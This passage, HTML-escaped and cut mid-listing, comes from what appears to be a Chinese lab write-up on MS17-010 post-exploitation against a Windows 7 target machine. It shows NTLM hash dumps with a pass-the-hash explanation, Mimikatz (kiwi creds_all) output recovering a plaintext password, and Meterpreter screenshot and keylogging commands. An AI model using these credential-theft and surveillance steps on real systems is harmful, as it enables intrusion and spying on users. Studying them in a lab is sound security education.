&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Ankh:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:e19302c2cb502fb48256d5cfbb575047:::
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;PS：这是靶机用户登陆密码的NTLM哈希。攻击者即使不知道明文，也可以通过“哈希传递攻击（Pass-the-Hash）”直接登录其他机器。&lt;/p&gt;
&lt;p&gt;在线哈希穷举解密：&lt;a class="link" href="https://cmd5.com/" target="_blank" rel="noopener"
&gt;CMD5&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src="http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/8.png"
width="770"
height="267"
srcset="http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/8_hu_a9e6e8566b8b5be0.png 480w, http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/8_hu_1523fbaa8535d8d8.png 1024w"
loading="lazy"
alt="8"
class="gallery-image"
data-flex-grow="288"
data-flex-basis="692px"
&gt;&lt;/p&gt;
&lt;h5 id="2-抓取内存中的明文密码mimikatz"&gt;2. 抓取内存中的明文密码（Mimikatz）
&lt;/h5&gt;&lt;p&gt;&lt;code&gt;load kiwi # 加载增强版的Mimikatz&lt;/code&gt; -&amp;gt; &lt;code&gt;creds_all # 尝试提取所有凭证&lt;/code&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;span class="lnt"&gt;14
&lt;/span&gt;&lt;span class="lnt"&gt;15
&lt;/span&gt;&lt;span class="lnt"&gt;16
&lt;/span&gt;&lt;span class="lnt"&gt;17
&lt;/span&gt;&lt;span class="lnt"&gt;18
&lt;/span&gt;&lt;span class="lnt"&gt;19
&lt;/span&gt;&lt;span class="lnt"&gt;20
&lt;/span&gt;&lt;span class="lnt"&gt;21
&lt;/span&gt;&lt;span class="lnt"&gt;22
&lt;/span&gt;&lt;span class="lnt"&gt;23
&lt;/span&gt;&lt;span class="lnt"&gt;24
&lt;/span&gt;&lt;span class="lnt"&gt;25
&lt;/span&gt;&lt;span class="lnt"&gt;26
&lt;/span&gt;&lt;span class="lnt"&gt;27
&lt;/span&gt;&lt;span class="lnt"&gt;28
&lt;/span&gt;&lt;span class="lnt"&gt;29
&lt;/span&gt;&lt;span class="lnt"&gt;30
&lt;/span&gt;&lt;span class="lnt"&gt;31
&lt;/span&gt;&lt;span class="lnt"&gt;32
&lt;/span&gt;&lt;span class="lnt"&gt;33
&lt;/span&gt;&lt;span class="lnt"&gt;34
&lt;/span&gt;&lt;span class="lnt"&gt;35
&lt;/span&gt;&lt;span class="lnt"&gt;36
&lt;/span&gt;&lt;span class="lnt"&gt;37
&lt;/span&gt;&lt;span class="lnt"&gt;38
&lt;/span&gt;&lt;span class="lnt"&gt;39
&lt;/span&gt;&lt;span class="lnt"&gt;40
&lt;/span&gt;&lt;span class="lnt"&gt;41
&lt;/span&gt;&lt;span class="lnt"&gt;42
&lt;/span&gt;&lt;span class="lnt"&gt;43
&lt;/span&gt;&lt;span class="lnt"&gt;44
&lt;/span&gt;&lt;span class="lnt"&gt;45
&lt;/span&gt;&lt;span class="lnt"&gt;46
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;meterpreter &amp;gt; load kiwi
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Loading extension kiwi...
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; .#####. mimikatz 2.2.0 &lt;span class="m"&gt;20191125&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;x64/windows&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; .## ^ &lt;span class="c1"&gt;##. &amp;#34;A La Vie, A L&amp;#39;Amour&amp;#34; - (oe.eo)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="c1"&gt;## / \ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="c1"&gt;## \ / ## &amp;gt; http://blog.gentilkiwi.com/mimikatz&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="s1"&gt;&amp;#39;## v ##&amp;#39;&lt;/span&gt; Vincent LE TOUX &lt;span class="o"&gt;(&lt;/span&gt; vincent.letoux@gmail.com &lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="s1"&gt;&amp;#39;#####&amp;#39;&lt;/span&gt; &amp;gt; http://pingcastle.com / http://mysmartlogon.com ***/
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Success.
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;meterpreter &amp;gt; creds_all
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; Running as SYSTEM
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Retrieving all credentials
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msv &lt;span class="nv"&gt;credentials&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;===============&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Username Domain LM NTLM SHA1
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;-------- ------ -- ---- ----
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Ankh Ankh-PC 44efce164ab921caa 32ed87bdb5fdc5e9c 6ed5833cf35286ebf8
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; ad3b435b51404ee ba88547376818d4 662b7b5949f0d742bb
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; ec3f
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;wdigest &lt;span class="nv"&gt;credentials&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;===================&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Username Domain Password
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;-------- ------ --------
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;(&lt;/span&gt;null&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;null&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;null&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;ANKH-PC$ WORKGROUP &lt;span class="o"&gt;(&lt;/span&gt;null&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Ankh Ankh-PC &lt;span class="m"&gt;123456&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;tspkg &lt;span class="nv"&gt;credentials&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;=================&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Username Domain Password
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;-------- ------ --------
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Ankh Ankh-PC &lt;span class="m"&gt;123456&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;kerberos &lt;span class="nv"&gt;credentials&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;====================&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Username Domain Password
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;-------- ------ --------
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;(&lt;/span&gt;null&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;null&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;null&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Ankh Ankh-PC &lt;span class="m"&gt;123456&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;ankh-pc$ WORKGROUP &lt;span class="o"&gt;(&lt;/span&gt;null&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;PS：在Win7中，攻击者通常能够直接看到&lt;strong&gt;Password&lt;/strong&gt;一栏显示了明文密码，这是由于Win7默认将凭据存储在lsass进程内存中，且未加密。SYSTEM权限可以直接读取它。&lt;/p&gt;
&lt;h4 id="二隐私监控与取证monitoring"&gt;二、隐私监控与取证（Monitoring）
&lt;/h4&gt;&lt;h5 id="1-实时屏幕截图"&gt;1. 实时屏幕截图
&lt;/h5&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;meterpreter &amp;gt; screenshot
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Screenshot saved to: /root/ZuMWyRDh.jpeg
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src="http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/7.png"
width="860"
height="618"
srcset="http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/7_hu_678321c30ae0e7d.png 480w, http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/7_hu_7ac598bae94a8f45.png 1024w"
loading="lazy"
alt="7"
class="gallery-image"
data-flex-grow="139"
data-flex-basis="333px"
&gt;&lt;/p&gt;
&lt;h5 id="2-键盘记录keylogging"&gt;2. 键盘记录（Keylogging）
&lt;/h5&gt;&lt;p&gt;如果当前是System权限则切换到用户权限 -&amp;gt; &lt;code&gt;keyscan_start # 开启键盘监听&lt;/code&gt; -&amp;gt; Ankh用户输入&lt;code&gt;Hello?&lt;/code&gt; -&amp;gt; &lt;code&gt;keyscan_dump # Kali屏幕输出记录下的按键&lt;/code&gt; -&amp;gt; &lt;code&gt;keyscan_stop # 停止监听&lt;/code&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt; 10
&lt;/span&gt;&lt;span class="lnt"&gt; 11
&lt;/span&gt;&lt;span class="lnt"&gt; 12
&lt;/span&gt;&lt;span class="lnt"&gt; 13
&lt;/span&gt;&lt;span class="lnt"&gt; 14
&lt;/span&gt;&lt;span class="lnt"&gt; 15
&lt;/span&gt;&lt;span class="lnt"&gt; 16
&lt;/span&gt;&lt;span class="lnt"&gt; 17
&lt;/span&gt;&lt;span class="lnt"&gt; 18
&lt;/span&gt;&lt;span class="lnt"&gt; 19
&lt;/span&gt;&lt;span class="lnt"&gt; 20
&lt;/span&gt;&lt;span class="lnt"&gt; 21
&lt;/span&gt;&lt;span class="lnt"&gt; 22
&lt;/span&gt;&lt;span class="lnt"&gt; 23
&lt;/span&gt;&lt;span class="lnt"&gt; 24
&lt;/span&gt;&lt;span class="lnt"&gt; 25
&lt;/span&gt;&lt;span class="lnt"&gt; 26
&lt;/span&gt;&lt;span class="lnt"&gt; 27
&lt;/span&gt;&lt;span class="lnt"&gt; 28
&lt;/span&gt;&lt;span class="lnt"&gt; 29
&lt;/span&gt;&lt;span class="lnt"&gt; 30
&lt;/span&gt;&lt;span class="lnt"&gt; 31
&lt;/span&gt;&lt;span class="lnt"&gt; 32
&lt;/span&gt;&lt;span class="lnt"&gt; 33
&lt;/span&gt;&lt;span class="lnt"&gt; 34
&lt;/span&gt;&lt;span class="lnt"&gt; 35
&lt;/span&gt;&lt;span class="lnt"&gt; 36
&lt;/span&gt;&lt;span class="lnt"&gt; 37
&lt;/span&gt;&lt;span class="lnt"&gt; 38
&lt;/span&gt;&lt;span class="lnt"&gt; 39
&lt;/span&gt;&lt;span class="lnt"&gt; 40
&lt;/span&gt;&lt;span class="lnt"&gt; 41
&lt;/span&gt;&lt;span class="lnt"&gt; 42
&lt;/span&gt;&lt;span class="lnt"&gt; 43
&lt;/span&gt;&lt;span class="lnt"&gt; 44
&lt;/span&gt;&lt;span class="lnt"&gt; 45
&lt;/span&gt;&lt;span class="lnt"&gt; 46
&lt;/span&gt;&lt;span class="lnt"&gt; 47
&lt;/span&gt;&lt;span class="lnt"&gt; 48
&lt;/span&gt;&lt;span class="lnt"&gt; 49
&lt;/span&gt;&lt;span class="lnt"&gt; 50
&lt;/span&gt;&lt;span class="lnt"&gt; 51
&lt;/span&gt;&lt;span class="lnt"&gt; 52
&lt;/span&gt;&lt;span class="lnt"&gt; 53
&lt;/span&gt;&lt;span class="lnt"&gt; 54
&lt;/span&gt;&lt;span class="lnt"&gt; 55
&lt;/span&gt;&lt;span class="lnt"&gt; 56
&lt;/span&gt;&lt;span class="lnt"&gt; 57
&lt;/span&gt;&lt;span class="lnt"&gt; 58
&lt;/span&gt;&lt;span class="lnt"&gt; 59
&lt;/span&gt;&lt;span class="lnt"&gt; 60
&lt;/span&gt;&lt;span class="lnt"&gt; 61
&lt;/span&gt;&lt;span class="lnt"&gt; 62
&lt;/span&gt;&lt;span class="lnt"&gt; 63
&lt;/span&gt;&lt;span class="lnt"&gt; 64
&lt;/span&gt;&lt;span class="lnt"&gt; 65
&lt;/span&gt;&lt;span class="lnt"&gt; 66
&lt;/span&gt;&lt;span class="lnt"&gt; 67
&lt;/span&gt;&lt;span class="lnt"&gt; 68
&lt;/span&gt;&lt;span class="lnt"&gt; 69
&lt;/span&gt;&lt;span class="lnt"&gt; 70
&lt;/span&gt;&lt;span class="lnt"&gt; 71
&lt;/span&gt;&lt;span class="lnt"&gt; 72
&lt;/span&gt;&lt;span class="lnt"&gt; 73
&lt;/span&gt;&lt;span class="lnt"&gt; 74
&lt;/span&gt;&lt;span class="lnt"&gt; 75
&lt;/span&gt;&lt;span class="lnt"&gt; 76
&lt;/span&gt;&lt;span class="lnt"&gt; 77
&lt;/span&gt;&lt;span class="lnt"&gt; 78
&lt;/span&gt;&lt;span class="lnt"&gt; 79
&lt;/span&gt;&lt;span class="lnt"&gt; 80
&lt;/span&gt;&lt;span class="lnt"&gt; 81
&lt;/span&gt;&lt;span class="lnt"&gt; 82
&lt;/span&gt;&lt;span class="lnt"&gt; 83
&lt;/span&gt;&lt;span class="lnt"&gt; 84
&lt;/span&gt;&lt;span class="lnt"&gt; 85
&lt;/span&gt;&lt;span class="lnt"&gt; 86
&lt;/span&gt;&lt;span class="lnt"&gt; 87
&lt;/span&gt;&lt;span class="lnt"&gt; 88
&lt;/span&gt;&lt;span class="lnt"&gt; 89
&lt;/span&gt;&lt;span class="lnt"&gt; 90
&lt;/span&gt;&lt;span class="lnt"&gt; 91
&lt;/span&gt;&lt;span class="lnt"&gt; 92
&lt;/span&gt;&lt;span class="lnt"&gt; 93
&lt;/span&gt;&lt;span class="lnt"&gt; 94
&lt;/span&gt;&lt;span class="lnt"&gt; 95
&lt;/span&gt;&lt;span class="lnt"&gt; 96
&lt;/span&gt;&lt;span class="lnt"&gt; 97
&lt;/span&gt;&lt;span class="lnt"&gt; 98
&lt;/span&gt;&lt;span class="lnt"&gt; 99
&lt;/span&gt;&lt;span class="lnt"&gt;100
&lt;/span&gt;&lt;span class="lnt"&gt;101
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;meterpreter &amp;gt; getuid &lt;span class="c1"&gt;# 查看当前权限：SYSTEM&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Server username: NT AUTHORITY&lt;span class="se"&gt;\S&lt;/span&gt;YSTEM
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;meterpreter &amp;gt; ps &lt;span class="c1"&gt;# 查看进程列表，Session 1通常代表用户&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Process &lt;span class="nv"&gt;List&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;============&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; PID PPID Name Arch Session User Path
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; --- ---- ---- ---- ------- ---- ----
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;System Pr
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; ocess&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;4&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt; System x64 &lt;span class="m"&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;268&lt;/span&gt; &lt;span class="m"&gt;4&lt;/span&gt; smss.exe x64 &lt;span class="m"&gt;0&lt;/span&gt; NT AUTHORITY&lt;span class="se"&gt;\S&lt;/span&gt;YS &lt;span class="se"&gt;\S&lt;/span&gt;ystemRoot&lt;span class="se"&gt;\S&lt;/span&gt;yste
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; TEM m32&lt;span class="se"&gt;\s&lt;/span&gt;mss.exe
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;312&lt;/span&gt; &lt;span class="m"&gt;484&lt;/span&gt; svchost.ex x64 &lt;span class="m"&gt;0&lt;/span&gt; NT AUTHORITY&lt;span class="se"&gt;\L&lt;/span&gt;OC
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; e AL SERVICE
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;344&lt;/span&gt; &lt;span class="m"&gt;328&lt;/span&gt; csrss.exe x64 &lt;span class="m"&gt;0&lt;/span&gt; NT AUTHORITY&lt;span class="se"&gt;\S&lt;/span&gt;YS C:&lt;span class="se"&gt;\W&lt;/span&gt;indows&lt;span class="se"&gt;\s&lt;/span&gt;ystem
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; TEM 32&lt;span class="se"&gt;\c&lt;/span&gt;srss.exe
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;360&lt;/span&gt; &lt;span class="m"&gt;484&lt;/span&gt; SearchInde x64 &lt;span class="m"&gt;0&lt;/span&gt; NT AUTHORITY&lt;span class="se"&gt;\S&lt;/span&gt;YS
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; xer.exe TEM
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;392&lt;/span&gt; &lt;span class="m"&gt;328&lt;/span&gt; wininit.ex x64 &lt;span class="m"&gt;0&lt;/span&gt; NT AUTHORITY&lt;span class="se"&gt;\S&lt;/span&gt;YS C:&lt;span class="se"&gt;\W&lt;/span&gt;indows&lt;span class="se"&gt;\s&lt;/span&gt;ystem
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; e TEM 32&lt;span class="se"&gt;\w&lt;/span&gt;ininit.exe
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;404&lt;/span&gt; &lt;span class="m"&gt;384&lt;/span&gt; csrss.exe x64 &lt;span class="m"&gt;1&lt;/span&gt; NT AUTHORITY&lt;span class="se"&gt;\S&lt;/span&gt;YS C:&lt;span class="se"&gt;\W&lt;/span&gt;indows&lt;span class="se"&gt;\s&lt;/span&gt;ystem
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; TEM 32&lt;span class="se"&gt;\c&lt;/span&gt;srss.exe
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;448&lt;/span&gt; &lt;span class="m"&gt;384&lt;/span&gt; winlogon.e x64 &lt;span class="m"&gt;1&lt;/span&gt; NT AUTHORITY&lt;span class="se"&gt;\S&lt;/span&gt;YS C:&lt;span class="se"&gt;\W&lt;/span&gt;indows&lt;span class="se"&gt;\s&lt;/span&gt;ystem
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; xe TEM 32&lt;span class="se"&gt;\w&lt;/span&gt;inlogon.exe
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;484&lt;/span&gt; &lt;span class="m"&gt;392&lt;/span&gt; services.e x64 &lt;span class="m"&gt;0&lt;/span&gt; NT AUTHORITY&lt;span class="se"&gt;\S&lt;/span&gt;YS C:&lt;span class="se"&gt;\W&lt;/span&gt;indows&lt;span class="se"&gt;\s&lt;/span&gt;ystem
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; xe TEM 32&lt;span class="se"&gt;\s&lt;/span&gt;ervices.exe
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;500&lt;/span&gt; &lt;span class="m"&gt;392&lt;/span&gt; lsass.exe x64 &lt;span class="m"&gt;0&lt;/span&gt; NT AUTHORITY&lt;span class="se"&gt;\S&lt;/span&gt;YS C:&lt;span class="se"&gt;\W&lt;/span&gt;indows&lt;span class="se"&gt;\s&lt;/span&gt;ystem
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; TEM 32&lt;span class="se"&gt;\l&lt;/span&gt;sass.exe
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;508&lt;/span&gt; &lt;span class="m"&gt;392&lt;/span&gt; lsm.exe x64 &lt;span class="m"&gt;0&lt;/span&gt; NT AUTHORITY&lt;span class="se"&gt;\S&lt;/span&gt;YS C:&lt;span class="se"&gt;\W&lt;/span&gt;indows&lt;span class="se"&gt;\s&lt;/span&gt;ystem
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; TEM 32&lt;span class="se"&gt;\l&lt;/span&gt;sm.exe
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;620&lt;/span&gt; &lt;span class="m"&gt;484&lt;/span&gt; svchost.ex x64 &lt;span class="m"&gt;0&lt;/span&gt; NT AUTHORITY&lt;span class="se"&gt;\S&lt;/span&gt;YS
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; e TEM
